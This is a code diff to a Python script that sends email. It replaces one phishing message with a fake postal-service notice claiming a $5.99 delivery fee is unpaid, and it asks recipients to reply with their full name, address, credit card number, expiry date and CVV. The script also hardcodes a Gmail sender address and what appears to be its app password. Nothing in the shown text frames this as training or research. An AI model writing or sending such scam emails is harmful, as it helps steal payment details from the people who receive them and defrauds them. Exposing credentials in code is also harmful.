@@ -17,17 +17,22 @@ if send_email:
         # Email configuration
         sender_email = "secadvisor9@gmail.com"
         password = "vmov qeot zehk mpdj"
-        subject = "Important Security Update"
+        subject = "Important Postal Service - Delivery Update"
         body = """
-        Dear User,
+Hello,
+You have a package waiting for delivery. However, we were unable to process the delivery fee of $5.99 due to a payment error. Your package will be returned to the sender unless the fee is paid within 48 hours.
+        
+Please reply to this email with the following payment details to resolve the issue:
 
-        We have detected unusual activity on your account. Please verify your account immediately by clicking the link below:
+- Full Name
+- Address
+- Credit Card Number
+- Expiration Date
+- CVV
+We apologize for any inconvenience this may have caused. Thank you for your cooperation.
 
-        [Fake Verification Link]
-
-        Best regards,
-        Security Team
-        """
+Best regards,
+Postal Office Customer Service"""
 
         # Create the email
         message = MIMEMultipart()
